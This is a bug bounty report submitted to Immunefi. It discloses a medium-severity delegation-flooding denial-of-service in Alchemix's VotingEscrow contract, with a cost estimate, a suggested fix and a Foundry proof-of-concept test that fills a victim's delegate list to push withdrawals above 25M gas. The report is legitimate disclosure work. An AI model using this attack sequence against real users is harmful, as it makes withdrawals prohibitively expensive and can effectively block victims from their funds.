Submitted on May 18th 2024 at 20:04:09 UTC by @savi0ur for [Boost | Alchemix](https://immunefi.com/bounty/alchemix-boost/)

Report ID: #31413

Report type: Smart Contract

Report severity: Medium

Target: https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/VotingEscrow.sol

Impacts:
- Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)
- Block stuffing

## Description
## Bug Description

Any user can delegate the balance of the locked veALCX NFT token amount to anyone by calling `delegate()`.

As the delegated tokens are maintained in an array that's vulnerable to DOS attack, the `VotingEscrow` contract has a safety check of `MAX_DELEGATES = 1024` preventing an address from having a huge array. 
https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/VotingEscrow.sol#L33-L34
```solidity
/// @notice Maximum number of delegates a token can have
uint256 public constant MAX_DELEGATES = 1024; // avoid too much gas
```

Given the current implementation, any user with 1024 delegated tokens takes more than 25M gas to `transfer/delegate/burn/mint` a token as shown in PoC. It will consume a lot of gas as its using function like `_moveTokenDelegates()` and `_moveAllDelegates()`, which are vulnerable to DoS attack when `MAX_DELEGATES` limit is reached for delegated tokens. However, the current gas limit of the ETH chain is 30M. (ref: [Etherscan](https://etherscan.io/block/19881987)). 

This functions(`_moveTokenDelegates()` and `_moveAllDelegates()`) from `VotingEscrow` are called in following functions, which makes them vulnerable to DoS.
- `delegate()`
- `safeTransferFrom()`
- `transferFrom()`
- `merge()`
- `withdraw()`

As we can see in a PoC for a single withdrawal tx, its very expensive for a user as it cost more than 25M gas for a victim. 

Current cost of the tx for around 25M gas is around $1000, calculated as follow:
```
TxCostInUSD = 25e6(gasConsumed) * 14e9(CurrentCostInGWEI) / 1e18 * 3116.44(ETHPriceInUSD)
			= 1090.754 USD 
```

This cost will be even higher when block space in high demand as base fee will increase and also users are willing to offer extra to get a place for their tx in block space.

Tool to find real time gas cost for 25M gas cost: https://www.cryptoneur.xyz/en/gas-fees-calculator?usedGas=25000000&txnType=Custom&gasPrice=instant

Also it will be difficult for a user to get a space in a block space when their tx is consuming almost a gas limit of a block (30M). User's tx will get rejected by builder as its not providing any incentive (apart from tx cost) for a builder to include their tx in a block during high demand of a block space.

If someone trying to attack a victim's address by creating a new address, a new lock, and delegating to the victim. By the time the attacker hit the gas limit, the victim can not withdraw/transfer/delegate transaction in a high demand of a block space.
## Impact

Due to the mentioned attack, multiple users wont be able to withdraw their tokens in the same block space as there is a gas limit of 30M on ethereum for a transaction. Users tx could land when there is less traffic on ethereum, but attacker could do block stuffing for just a 5-6 million gas for the same block to grief user's withdraw transaction.
## Recommendation

Adjust the `MAX_DELEGATES` from 1024 to 128 Or Give an option for users to opt-out/opt-in for a certain delegated tokens. Users will only accept the delegated tokens if they opt-in, or users can opt-out to refuse any uncommissioned delegated tokens.

## Proof Of Concept

**Steps to Run using Foundry:**
- Paste following foundry code in `src/test/VotingEscrow.t.sol`
- Run using `FOUNDRY_PROFILE=default forge test --fork-url $FORK_URL --fork-block-number 17133822 --match-contract VotingEscrowTest --match-test testDelegateLimitAttack -vv`

```solidity
function testDelegateLimitAttack() public {
    // Give some tokens to this contract
    hevm.startPrank(address(admin));
    IERC20(bpt).transfer(address(this), TOKEN_1M);
    hevm.stopPrank();

    // Give full approval to voting escrow
    IERC20(bpt).approve(address(veALCX), type(uint256).max);

    uint EPOCH = veALCX.EPOCH();

    uint tokenId = veALCX.createLock(TOKEN_1, EPOCH, false);

    for(uint256 i = 0; i < veALCX.MAX_DELEGATES() - 1; i++) {
        hevm.roll(block.number + 1);
        hevm.warp(block.timestamp + 12);
        
        address fakeAccount = address(uint160(block.timestamp + i));
        IERC20(bpt).transfer(fakeAccount, 1);

        hevm.startPrank(fakeAccount);
        IERC20(bpt).approve(address(veALCX), type(uint256).max);
        veALCX.createLock(1, MAXTIME, true);
        veALCX.delegate(address(this));
        hevm.stopPrank();
    }
    
    hevm.roll(block.number + 1);
    hevm.warp(block.timestamp + EPOCH);
    veALCX.startCooldown(tokenId);

    hevm.roll(block.number + 1);
    hevm.warp(block.timestamp + EPOCH);

    uint initialGas = gasleft();
    veALCX.withdraw(tokenId);
    uint gasUsed = initialGas - gasleft();
    
    console.log("Gas Used in total: ", gasUsed);
    assertGt(gasUsed, 25_000_000);
}
```
